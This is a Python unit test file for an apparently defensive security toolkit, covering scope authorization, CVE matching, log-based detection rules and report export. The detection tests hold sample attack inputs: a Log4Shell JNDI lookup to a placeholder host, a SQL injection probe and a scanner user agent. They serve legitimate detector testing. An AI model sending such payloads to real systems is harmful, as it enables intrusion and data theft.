"""Unit tests for outcats core logic (no network required)."""

from __future__ import annotations

import time

import pytest

from outcats.authorization import Scope, is_in_scope
from outcats.common.report import Finding, Report, Severity, Status
from outcats.detect.engine import DetectionEngine, load_rules
from outcats.scan import cve


# --------------------------------------------------------------------------
# Authorization scope
# --------------------------------------------------------------------------
def _scope() -> Scope:
    return Scope(
        operator="t",
        authorization_ref="own",
        attested_at=time.time(),
        allowed_hosts=["10.0.0.0/24", "myhost.local"],
    )


def test_loopback_always_in_scope():
    assert is_in_scope("127.0.0.1", _scope())
    assert is_in_scope("localhost", _scope())


def test_cidr_membership():
    s = _scope()
    assert is_in_scope("10.0.0.55", s)
    assert not is_in_scope("10.0.1.55", s)


def test_exact_host_match():
    assert is_in_scope("myhost.local", _scope())


def test_out_of_scope_public_ip():
    assert not is_in_scope("8.8.8.8", _scope())


# --------------------------------------------------------------------------
# CVE correlation
# --------------------------------------------------------------------------
def test_version_parse_handles_patch_letters():
    assert cve._parse_version("9.3p2") == (9, 3, 0, 2)
    assert cve._parse_version("2.4.49") == (2, 4, 49)


def test_openssh_vulnerable_and_fixed():
    assert any(m.cve == "CVE-2024-6387" for m in cve.correlate("openssh", "9.6p1"))
    assert cve.correlate("openssh", "9.9p1") == []


def test_unknown_version_flags_for_verification():
    matches = cve.correlate("nginx", None)
    assert matches and matches[0].summary.startswith("[version unknown")


# --------------------------------------------------------------------------
# Detection engine
# --------------------------------------------------------------------------
def test_ssh_bruteforce_threshold():
    rules = load_rules()
    engine = DetectionEngine(rules)
    lines = [
        f"Jul 25 22:10:0{i} host sshd: Failed password for invalid user u{i} "
        f"from 203.0.113.7 port 5100{i} ssh2"
        for i in range(6)
    ]
    alerts = engine.run(lines)
    brute = [a for a in alerts if a.rule_id == "OC-DET-SSH-BRUTE"]
    assert brute and brute[0].actor == "203.0.113.7"


def test_below_threshold_does_not_fire():
    rules = load_rules()
    engine = DetectionEngine(rules)
    lines = [
        "Jul 25 22:10:01 host sshd: Failed password for invalid user a "
        "from 203.0.113.9 port 51001 ssh2",
        "Jul 25 22:10:02 host sshd: Failed password for invalid user b "
        "from 203.0.113.9 port 51002 ssh2",
    ]
    alerts = [a for a in engine.run(lines) if a.rule_id == "OC-DET-SSH-BRUTE"]
    assert alerts == []


def test_sqli_probe_detected():
    engine = DetectionEngine(load_rules())
    line = ('192.0.2.66 - - [25/Jul/2026:22:15:10 +0000] '
            '"GET /x?id=1 union select a,b from users HTTP/1.1" 200 1 "-" "x"')
    alerts = [a for a in engine.run([line]) if a.rule_id == "OC-DET-WEB-SQLI-PROBE"]
    assert alerts


def test_log4shell_probe_detected():
    engine = DetectionEngine(load_rules())
    line = ('203.0.113.5 - - [25/Jul/2026:10:00:00 +0000] '
            '"GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://evil.example/a}"')
    alerts = [a for a in engine.run([line]) if a.rule_id == "OC-DET-WEB-LOG4SHELL"]
    assert alerts and alerts[0].severity == "critical"


def test_scanner_user_agent_detected():
    engine = DetectionEngine(load_rules())
    line = ('198.51.100.2 - - [25/Jul/2026:10:00:00 +0000] '
            '"GET /admin HTTP/1.1" 404 1 "-" "sqlmap/1.7"')
    assert [a for a in engine.run([line]) if a.rule_id == "OC-DET-SCANNER-UA"]


# --------------------------------------------------------------------------
# Report rendering
# --------------------------------------------------------------------------
def test_platform_routing_filters_checks():
    from outcats.harden import checks

    linux = {c.id for c in checks.all_checks(level=2, plat="linux")}
    macos = {c.id for c in checks.all_checks(level=2, plat="macos")}
    windows = {c.id for c in checks.all_checks(level=2, plat="windows")}
    assert "OC-NET-001" in linux and "OC-NET-001" not in windows
    assert any(i.startswith("OC-MAC-") for i in macos)
    assert any(i.startswith("OC-WIN-") for i in windows)
    # Windows-only checks must not leak into the Linux set.
    assert not any(i.startswith("OC-WIN-") for i in linux)


def test_report_counts_and_json():
    r = Report(module="harden", target="host")
    r.add(Finding("A", "ok", Severity.LOW, Status.PASS))
    r.add(Finding("B", "bad", Severity.HIGH, Status.FAIL, remediation="fix it"))
    assert r.counts_by_status()["pass"] == 1
    assert r.counts_by_status()["fail"] == 1
    assert r.counts_by_severity()["high"] == 1
    assert '"module": "harden"' in r.to_json()
    assert "outcats report" in r.to_html()



# --------------------------------------------------------------------------
# New module tests
# --------------------------------------------------------------------------
def test_password_policy_audit():
    from outcats.harden.passwords import audit_password_policy

    report = audit_password_policy()
    # Should have at least some findings on Linux
    assert report.findings


def test_csv_export():
    from outcats.common.export import to_csv

    r = Report(module="test", target="t")
    r.add(Finding("A", "title", Severity.LOW, Status.PASS, detail="x"))
    csv = to_csv(r)
    assert "A,title,low,pass" in csv


def test_pdf_export_has_print_css():
    from outcats.common.export import to_pdf_html

    r = Report(module="test", target="t")
    r.add(Finding("B", "title2", Severity.HIGH, Status.FAIL))
    html = to_pdf_html(r)
    assert "@media print" in html
    assert "outcats report" in html


def test_netmap_import_and_table():
    from outcats.netmap.mapper import NetworkMap, HostEntry

    h = HostEntry(host="10.0.0.1", open_ports=[22, 80], services={22: "ssh", 80: "http"})
    nm = NetworkMap(hosts=[h], all_ports={22, 80})
    table = nm.to_table(color=False)
    assert "10.0.0.1" in table
    assert "ssh" in table


def test_tls_checker_connection_refused():
    from outcats.tlscheck.checker import check_tls

    result = check_tls("127.0.0.1", port=19999, timeout=0.5)
    assert result.errors  # should have connection error


def test_osint_recon_import():
    from outcats.osint.recon import DomainInfo, recon_to_report

    info = DomainInfo(
        domain="example.com",
        dns_records={"A": ["93.184.216.34"]},
        security_headers={"Strict-Transport-Security": True, "X-Frame-Options": False},
        subdomains=["www.example.com"],
    )
    report = recon_to_report(info)
    assert any("DNS A" in f.title for f in report.findings)
    assert any("Missing" in f.title for f in report.findings)


def test_interactive_import():
    from outcats.interactive import run_interactive
    # Just verify import works (can't test stdin interaction)
    assert callable(run_interactive)
